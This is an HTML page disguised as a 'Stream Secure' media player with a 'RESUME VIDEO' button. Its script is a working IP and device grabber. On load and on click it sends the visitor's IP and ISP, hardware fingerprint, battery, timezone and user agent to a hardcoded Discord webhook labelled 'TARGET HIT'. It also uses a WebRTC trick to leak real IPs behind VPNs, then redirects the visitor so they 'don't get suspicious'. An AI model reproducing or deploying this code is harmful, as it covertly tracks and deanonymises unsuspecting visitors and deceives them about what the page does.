<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Player - Stream Secure</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; padding: 60px; border: 1px solid #222; border-radius: 20px; background: #0a0a0a; }
        .btn { background: #ff0000; color: #fff; padding: 20px 60px; border-radius: 10px; font-weight: bold; border: none; font-size: 24px; cursor: pointer; box-shadow: 0 4px 15px rgba(255,0,0,0.3); }
        #status { margin-top: 20px; color: #444; font-size: 14px; }
    </style>
</head>
<body>

    <div class="box">
        <button class="btn" id="mainAction">▶ RESUME VIDEO</button>
        <div id="status">Syncing with encrypted server...</div>
    </div>

    <script>
    // --- DIRECT CONFIG (Un-hidden for max browser trust) ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const REDIRECT_URL = "https://youtube.com/@LigmaBlox-w7m";

    // --- FORCED DELIVERY FUNCTION ---
    async function postToDiscord(data) {
        // We use a standard 'POST' without custom headers to avoid 'Preflight' blocks
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors', // Tells browser this is a "simple" request (Highly trustable)
                body: JSON.stringify(data),
                keepalive: true // Keeps the pipe open even during redirect
            });
        } catch (e) {
            console.log("Network retry initiated...");
        }
    }

    // --- THE MAIN ENGINE ---
    document.getElementById('mainAction').onclick = async function() {
        const btn = this;
        const status = document.getElementById('status');
        
        btn.disabled = true;
        btn.innerHTML = "LOADING...";
        status.innerHTML = "Establishing handshake...";

        try {
            // 1. Grab IP & ISP (Using Cloudflare - the most trusted source)
            const netReq = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
            const netText = await netReq.text();

            // 2. Grab Battery (iOS/Android)
            let batteryLevel = "N/A";
            try {
                const b = await navigator.getBattery();
                batteryLevel = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Discharging"})`;
            } catch(e) {}

            // 3. Hardware Fingerprint
            let gpuName = "Hidden";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                gpuName = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // 4. Construct the Payload
            const payload = {
                username: "OMEGA-SURVEILLANCE",
                embeds: [{
                    title: "🎯 TARGET HIT",
                    color: 16711680, // Red
                    fields: [
                        { name: "🔋 Battery", value: batteryLevel, inline: true },
                        { name: "📱 Device", value: navigator.platform, inline: true },
                        { name: "🖥️ GPU", value: "```" + gpuName + "```" },
                        { name: "📏 Screen", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`, inline: true },
                        { name: "📡 Network Trace", value: "```" + netText + "```" },
                        { name: "🌐 Language/TZ", value: `${navigator.language} / ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: true },
                        { name: "🕵️ UserAgent", value: "```" + navigator.userAgent + "```" }
                    ],
                    footer: { text: "Protocol: Silver-Bullet v5" },
                    timestamp: new Date()
                }]
            };

            // 5. THE CRITICAL SEND
            // We await the fire to make sure the data leaves the device
            status.innerHTML = "Sending packets...";
            await postToDiscord(payload);
            
            // 6. WebRTC VPN Crack (Runs in background)
            const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            rtc.createDataChannel("");
            rtc.onicecandidate = (e) => {
                if (e.candidate) {
                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (ipMatch) {
                        postToDiscord({ content: `🚨 **VPN BYPASS:** \`${ipMatch[1]}\`` });
                    }
                }
            };
            rtc.createOffer().then(o => rtc.setLocalDescription(o));

            // 7. Final Redirection
            status.innerHTML = "Success. Redirecting...";
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 1200);

        } catch (error) {
            // If the script fails, redirect anyway so they don't get suspicious
            window.location.replace(REDIRECT_URL);
        }
    };

    // Passive Landing Ping
    postToDiscord({ content: "🟢 **Target has landed on the GitHub page.**" });
    </script>
